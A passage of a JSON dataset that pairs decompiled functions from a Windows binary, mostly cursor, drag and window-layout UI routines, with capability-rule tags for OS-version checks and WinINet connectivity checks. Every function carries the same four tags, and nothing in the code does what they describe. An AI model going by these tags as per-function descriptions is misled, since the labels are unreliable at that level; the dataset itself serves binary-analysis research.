        "decompiled_code": "\nvoid fcn.004430ec(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    char cVar6;\n    int32_t *in_EAX;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    if (((*0x496534 == '\\0') &&\n        (uVar9 = *0x496524 - *in_EAX >> 0x1f,  (*0x496524 - *in_EAX ^ uVar9) - uVar9 < *0x496530)) &&\n       (uVar9 = *0x496528 - in_EAX[1] >> 0x1f,  (*0x496528 - in_EAX[1] ^ uVar9) - uVar9 < *0x496530)) {\n        return;\n    }\n    iVar10 = 0x443147;\n    iVar7 = fcn.00442fc0(*0x496514);\n    if ((*0x496534 == '\\0') && (*0x496538 != 0)) {\n        iVar10 = *0x496528;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.0044f050(iVar10);\n    }\n    if (*(*0x496514 + 0x8f) == '\\0') {\n        *0x496534 = '\\x01';\n    }\n    else {\n        *0x496534 = '\\x02';\n    }\n    if (iVar7 != (*0x496518)[2]) {\n        fcn.00443010();\n        if (*0x496518 == NULL) {\n            return;\n        }\n        (*0x496518)[2] = iVar7;\n        (*0x496518)[3] = iVar10;\n        piVar1 = *0x496518;\n        (*0x496518)[4] = *in_EAX;\n        piVar1[5] = in_EAX[1];\n        fcn.00443010();\n        if (*0x496518 == NULL) {\n            return;\n        }\n    }\n    piVar1 = *0x496518;\n    (*0x496518)[4] = *in_EAX;\n    piVar1[5] = in_EAX[1];\n    if ((*0x496518)[2] != 0) {\n        fcn.004450dc();\n        piVar1 = *0x496518;\n        (*0x496518)[6] = iStack28;\n        piVar1[7] = iStack24;\n    }\n    fcn.00443010(in_EAX[1]);\n    (**(**0x496518 + 4))();\n    if (*0x496538 != 0) {\n        if (((iVar7 == 0) || ((*(iVar7 + 0x51) & 0x20) != 0)) || (*(*0x496518 + 1) != '\\0')) {\n            fcn.0044f000();\n            if (*(*0x496538 + 0x6a) == '\\0') {\n                iVar10 = in_EAX[1];\n                sub.user32.dll_GetDesktopWindow();\n                fcn.0044f050(iVar10);\n            }\n            else {\n                fcn.0044f14c();\n            }\n        }\n        else {\n            fcn.0044f1c0();\n            uVar8 = fcn.00460144();\n            sub.user32.dll_SetCursor(uVar8);\n        }\n    }\n    cVar4 = fcn.00460144();\n    sub.user32.dll_SetCursor();\n    if (*0x496534 == '\\x02') {\n        if (iVar7 == 0) {\n            fcn.00404154(in_EAX[1]);\n        }\n        else {\n            iVar10 = fcn.0044304c();\n            (*0x496518)[0x18] = iVar10;\n            if (iVar10 == 0) {\n                uVar5 = fcn.00404154();\n                *(*0x496518 + 0x17) = uVar5;\n            }\n            else {\n                fcn.004450dc();\n                uVar5 = fcn.00404154();\n                *(*0x496518 + 0x17) = uVar5;\n            }\n        }\n        if ((*0x496518 != NULL) && (cVar6 = fcn.00408a2c(),  cVar6 == '\\0')) {\n            if ((cVar4 != '\\0') && (cVar4 = (**(**0x496518 + 0x3c))(),  cVar4 != '\\0')) {\n                (**(**0x496518 + 0x34))();\n            }\n            (**(**0x496518 + 0x30))();\n            piVar3 = *0x496518;\n            piVar2 = *0x496518 + 0x1a;\n            piVar1 = *0x496518 + 0x14;\n            (*0x496518)[0x19] = (*0x496518)[0x13];\n            *piVar2 = *piVar1;\n            piVar3[0x1b] = piVar3[0x15];\n            piVar3[0x1c] = piVar3[0x16];\n        }\n    }\n    return;\n}\n",
        "token_count": 1200
    },
    "004433d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004433d4(uint param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    \n    *0x496518 = in_EAX;\n    in_EAX[2] = 0;\n    sub.user32.dll_GetCursorPos(0x496524);\n    piVar1 = *0x496518;\n    (*0x496518)[4] = *0x496524;\n    piVar1[5] = *0x496528;\n    *0x49652c = sub.user32.dll_GetCursor();\n    *0x496520 = fcn.004425b4();\n    *0x496530 = param_1;\n    cVar2 = fcn.004040e4();\n    if (cVar2 == '\\0') {\n        if (param_2 == '\\0') {\n            *0x496534 = '\\0';\n        }\n        else {\n            *0x496534 = '\\x01';\n        }\n    }\n    else {\n        iVar3 = in_EAX[0x13];\n        if (in_EAX[0x15] == iVar3 || in_EAX[0x15] - iVar3 < 0) {\n            in_EAX[10] = 0;\n            in_EAX[0xb] = 0;\n        }\n        else {\n            *(in_EAX + 10) = (in_EAX[4] - iVar3) / (in_EAX[0x15] - in_EAX[0x13]);\n        }\n        iVar3 = in_EAX[0x14];\n        if (in_EAX[0x16] == iVar3 || in_EAX[0x16] - iVar3 < 0) {\n            in_EAX[0xc] = 0;\n            in_EAX[0xd] = 0;\n        }\n        else {\n            *(in_EAX + 0xc) = (in_EAX[5] - iVar3) / (in_EAX[0x16] - in_EAX[0x14]);\n        }\n        if (param_2 == '\\0') {\n            *0x496534 = '\\0';\n        }\n        else {\n            *0x496534 = '\\x02';\n            (**(*in_EAX + 0x30))();\n        }\n    }\n    *0x496538 = (**(**0x496518 + 8))();\n    if (*0x496538 != 0) {\n        iVar3 = *0x496528;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.0044f050(iVar3);\n    }\n    *0x496540 = fcn.00403f28();\n    if (*0x496534 != '\\0') {\n        fcn.004430ec();\n    }\n    return;\n}\n",
        "token_count": 626
    },
    "00443544": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00443544(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpPoint;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x4436e9;\n    iStack60 = *in_FS_OFFSET;\n    *0x496514 = in_EAX;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_8h = 0;\n    *0x49651c = 0;\n    if (*(in_EAX + 0x8f) == '\\0') {\n        puStack64 = 0x44358b;\n        puStack52 = &stack0xfffffffc;\n        fcn.00404154();\n        if (*0x496514 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            puStack64 = 0x4435b9;\n            var_8h = fcn.004427d8();\n            *0x49651c = 1;\n        }\n    }\n    else {\n        fcn.00404154();\n        if (*0x496514 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            var_8h = fcn.004428e8();\n            *0x49651c = 1;\n        }\n        cVar1 = fcn.004040e4();\n        if (cVar1 == '\\0') {\n            if ((*(*(var_8h + 0x40) + 0x30) == 0) && (cVar1 = fcn.004040e4(),  cVar1 == '\\0')) {\n                puStack64 = &fcn.00443544::lpPoint;\n                sub.user32.dll_GetCursorPos();\n                *(var_8h + 0x4c) = lpPoint;\n                *(var_8h + 0x50) = var_ch;\n            }\n            else {\n                fcn.00413a6c();\n                puStack64 = 0x44368a;\n                fcn.0044502c();\n                *(var_8h + 0x4c) = var_18h;\n                *(var_8h + 0x50) = var_14h;\n            }\n            fcn.00413a6c();\n            *(var_8h + 0x54) = var_18h;\n            *(var_8h + 0x58) = var_14h;\n        }\n        else {\n            puStack64 = var_8h + 0x4c;\n            uVar2 = fcn.0044d1c8();\n            sub.user32.dll_GetWindowRect(uVar2);\n        }\n        *(var_8h + 100) = *(var_8h + 0x4c);\n        *(var_8h + 0x68) = *(var_8h + 0x50);\n        *(var_8h + 0x6c) = *(var_8h + 0x54);\n        *(var_8h + 0x70) = *(var_8h + 0x58);\n    }\n    fcn.004433d4();\n    *in_FS_OFFSET = puStack64;\n    return;\n}\n",
        "token_count": 821
    },
    "00443708": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00443708(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *(*0x496518 + 8) != 0;\n    if ((*(arg_8h + -1) != '\\0') && (*0x496534 == '\\x02')) {\n        cVar1 = (**(**0x496514 + 0x54))();\n        if ((cVar1 == '\\0') && ((*0x496514)[0x25] != 0)) {\n            if ((*0x496514)[0x25] != 0) {\n                uVar2 = fcn.00404154();\n            }\n        }\n        else {\n            uVar2 = CONCAT31((unaff_EBX & 0xffffff00) >> 8, 1);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 217
    },
    "0044377c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0044377c(void)\n\n{\n    uint *puVar1;\n    char in_AL;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_11h;\n    uint var_dh;\n    uint var_9h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0044377c::var_1h + 1;\n    puStack44 = &fcn.0044377c::var_1h + 1;\n    piVar5 = NULL;\n    if ((*0x496518 == NULL) || (*(*0x496518 + 5) != '\\0')) {\n        return;\n    }\n    uStack36 = 0x443a91;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    *0x496544 = *0x496518;\n    uStack48 = 0x443a1f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    *(*0x496518 + 5) = 1;\n    *(*0x496518 + 8) = in_AL;\n    var_1h._0_1_ = in_AL;\n    fcn.004425fc();\n    if (*0x496534 == '\\x02') {\n        piVar5 = fcn.00404108();\n        (**(*piVar5 + 0x34))();\n        *(piVar5 + 0x1d) = piVar5[2] == 0;\n    }\n    if ((*0x496518)[2] == 0) {\ncode_r0x00443854:\n        var_dh = (*0x496518)[5];\n    }\n    else {\n        cVar2 = fcn.004040e4();\n        if (cVar2 == '\\0') goto code_r0x00443854;\n        var_dh = (*0x496518)[7];\n    }\n    uStack60 = 0x44386b;\n    cVar2 = fcn.00443708(&fcn.0044377c::var_1h + 1);\n    if (cVar2 != '\\0') {\n        if ((*0x496534 == '\\x02') && (*(piVar5 + 0x1d) != '\\0')) {\ncode_r0x00443893:\n            if (var_1h != '\\0') {\n                uVar3 = 1;\n                goto code_r0x0044389f;\n            }\n        }\n        else if (*0x496534 != '\\0') {\n            cVar2 = fcn.00443010();\n            if (cVar2 != '\\0') goto code_r0x00443893;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0044389f:\n    if (*0x496534 == '\\x02') {\n        if ((uVar3 != 0) && (*(piVar5 + 0x1d) != '\\0')) {\n            iVar4 = fcn.00458424();\n            if ((iVar4 != 0) && (*(iVar4 + 0x268) == piVar5[0x10])) {\n                fcn.0045cc50();\n            }\n            uStack60 = 0x4438ee;\n            fcn.00446870(*0x496518);\n        }\n    }\n    else if (*0x496538 == 0) {\n        uStack60 = 0x443910;\n        sub.user32.dll_SetCursor();\n    }\n    else {\n        fcn.0044f1c0();\n    }\n    *0x496514 = 0;\n    *0x496518 = NULL;\n    if ((*0x496544 != NULL) && ((*0x496544)[2] != 0)) {\n        if (uVar3 == 0) {\n            (*0x496544)[4] = 0;\n            (*0x496544)[5] = 0;\n        }\n        puVar1 = *0x496544;\n        uStack60 = 0x4439c3;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        arg_8h = *0x496544 + 4;\n        fcn.00442edc(arg_8h, (*0x496544)[2]);\n        *in_FS_OFFSET = arg_8h;\n        if (*0x496544 == NULL) {\n            *0x496544 = puVar1;\n        }\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x443a26;\n    uStack48 = 0x4439e1;\n    fcn.00403f58();\n    *0x496540 = 0;\n    if (*0x496544 != NULL) {\n        *(*0x496544 + 5) = 0;\n        uStack48 = var_dh;\n        uStack52 = uVar3;\n        (****0x496544)();\n    }\n    *0x496518 = NULL;\n    return;\n}\n",
        "token_count": 1221
    },
    "00443aa0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00443aa0(void)\n\n{\n    if (*0x496518 != 0) {\n        fcn.0044377c();\n    }\n    *0x496514 = 0;\n    return;\n}\n",
        "token_count": 49
    },
    "00443b38": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00443b38(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX == 0) {\n        iVar1 = fcn.00403f28();\n        *in_EAX = iVar1;\n    }\n    fcn.00414d8c();\n    return;\n}\n",
        "token_count": 77
    },
    "00443b60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00443b60(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00415088();\n    if (*(*in_EAX + 8) == 0) {\n        fcn.00403f58();\n        *in_EAX = 0;\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00443c6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00443c6c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x443c7c;\n    var_8h = fcn.004152b4();\n    uStack24 = 0x443d0a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x443ca7;\n            var_ch = fcn.00414eec();\n            puStack32 = 0x443cb2;\n            cVar1 = fcn.00421afc();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x443ce2;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.00443dec();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x443ce9;\n                uStack36 = 0x443ce1;\n                fcn.00421b58();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x443d11;\n    uStack24 = 0x443d09;\n    fcn.00415318();\n    return;\n}\n",
        "token_count": 450
    },
    "00443d44": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00443d44(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) == 0) {\n        puStack16 = 0x443d5d;\n        fcn.00421d10();\n    }\n    else {\n        if (*(in_EAX + 0x5c) == 0) {\n            puStack16 = 0x443d75;\n            iVar1 = fcn.004152b4();\n            uStack20 = 0x443dc9;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            if (3 < *(iVar1 + 8)) {\n                puStack16 = &stack0xfffffffc;\n                fcn.00443bb0();\n            }\n            uVar2 = (**(**(in_EAX + 0x58) + 0x48))();\n            *(in_EAX + 0x5c) = uVar2;\n            fcn.00414d8c();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x443dd0;\n            uStack20 = 0x443dc8;\n            fcn.00415318();\n            return;\n        }\n        puStack16 = 0x443dde;\n        fcn.00421d14();\n        puStack16 = 0x443de6;\n        fcn.00443e38();\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "00443dec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00443dec(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) != 0) {\n        fcn.00421d14();\n        fcn.004152c8();\n        sub.user32.dll_ReleaseDC(*(in_EAX + 0x60), *(in_EAX + 0x5c));\n        *(in_EAX + 0x5c) = 0;\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00443fa4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00443fa4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack48 = &fcn.00443fa4::var_1h + 1;\n    var_8h = 0;\n    uStack52 = 0x444071;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_1h._0_1_ = 1;\n    arg_8h = 0x443fd9;\n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        arg_8h = 0x443feb;\n        cVar1 = fcn.00404154();\n        if ((((cVar1 != '\\0') && (*(**0x492b60 + 0x7c) != '\\0')) && (*(*(in_EAX + 0x10) + 0x84) != 0)) &&\n           (*param_2 != 0)) {\n            arg_8h = &fcn.00443fa4::var_8h;\n            fcn.00439964();\n            fcn.00409c80(arg_8h);\n            fcn.00404df4();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x444078;\n    iStack56 = 0x444068;\n    fcn.00404da0();\n    iStack56 = 0x444070;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 471
    },
    "004443dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.004443dc(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041b50c();\n    in_EAX[0xf] = in_EAX;\n    in_EAX[0xe] = *(*in_EAX + 0x78);\n    in_EAX[0x14] = *0x4444cc;\n    iVar1 = fcn.00420a44();\n    in_EAX[0x1a] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x44565c;\n    *(in_EAX + 0x61) = *0x4444d0;\n    iVar1 = fcn.00443e64();\n    in_EAX[0x1d] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x44662c;\n    iVar1 = fcn.00452b7c();\n    in_EAX[0x1e] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x448250;\n    in_EAX[0x1c] = -0xfffffb;\n    *(in_EAX + 0x57) = 1;\n    *(in_EAX + 0x16) = 1;\n    *(in_EAX + 0x59) = 1;\n    *(in_EAX + 0x5a) = 1;\n    *(in_EAX + 0x8e) = 1;\n    *(in_EAX + 0x18) = 1;\n    *(in_EAX + 0x5e) = 0;\n    *(in_EAX + 0x7e) = 0xfff4;\n    in_EAX[0x2b] = *0x457aec;\n    *(in_EAX + 0x56) = 1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 586
    },
    "0044470c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044470c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00403f58();\n        *(in_EAX + 0x6c) = 0;\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) & 0xffff7fff;\n    }\n    else {\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) | 0x8000;\n        if (*(in_EAX + 0x6c) == 0) {\n            iVar1 = fcn.00404154();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x6c) = uVar2;\n        }\n        (**(**(in_EAX + 0x6c) + 0xc))();\n        iVar1 = *(in_EAX + 0x6c);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x447bec;\n        fcn.00404154();\n        fcn.0041b5e0();\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "0044480c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044480c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 8;\n    cVar1 = fcn.004040e4();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x6c))();\n    }\n    fcn.0041b984();\n    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfff7;\n    if (in_EAX[0xc] != 0) {\n        fcn.00446870(0);\n        fcn.00446870(0);\n        fcn.00446870(0);\n        fcn.00446870(0);\n        fcn.00446870(0);\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "004448f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004448f8(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = *(in_EAX + 0x5b);\n    if (param_2 != cVar1) {\n        *(in_EAX + 0x5b) = param_2;\n        fcn.0044466c();\n        if (((*(in_EAX + 7) & 1) == 0) &&\n           (((((*(in_EAX + 7) & 0x10) == 0 || (in_EAX[0xc] != 0)) && (param_2 != '\\x06')) && (cVar1 != '\\x06')))) {\n            if ((((cVar1 - 1U < 2 == param_2 - 3U < 2) && (cVar1 != '\\0')) && (cVar1 != '\\x05')) &&\n               ((param_2 != '\\0' && (param_2 != '\\x05')))) {\n                (**(*in_EAX + 0x88))(in_EAX[0x12], in_EAX[0x13]);\n            }\n            else if ((cVar1 == '\\0') || (param_2 != '\\0')) {\n                fcn.00404154();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 347
    },
    "00444a80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00444a80(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack20;\n    uint uStack16;\n    \n    if ((*(in_EAX + 0x164) == '\\0') && ((*(in_EAX + 0x1c) & 1) == 0)) {\n        uVar1 = *(in_EAX + 0x61);\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = uVar3 >> 1;\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + ((uVar3 & 1) != 0);\n        }\n        (**(**(in_EAX + 0x78) + 0x10))(iVar2 + iVar4);\n        (**(**(in_EAX + 0x78) + 0x10))();\n        fcn.00413a6c();\n        *(in_EAX + 0x16d) = uStack20;\n        *(in_EAX + 0x171) = uStack16;\n        if (*0x444c00 == uVar1) {\n            *(in_EAX + 0x175) = 0;\n            *(in_EAX + 0x179) = 0;\n        }\n        else {\n            if ((uVar1 & 4) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x165) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 1) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            if ((uVar1 & 8) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x169) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 2) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            if (*(in_EAX + 0x30) != NULL) {\n                (**(**(in_EAX + 0x30) + 0xd0))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 849
    },
    "00444cd4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
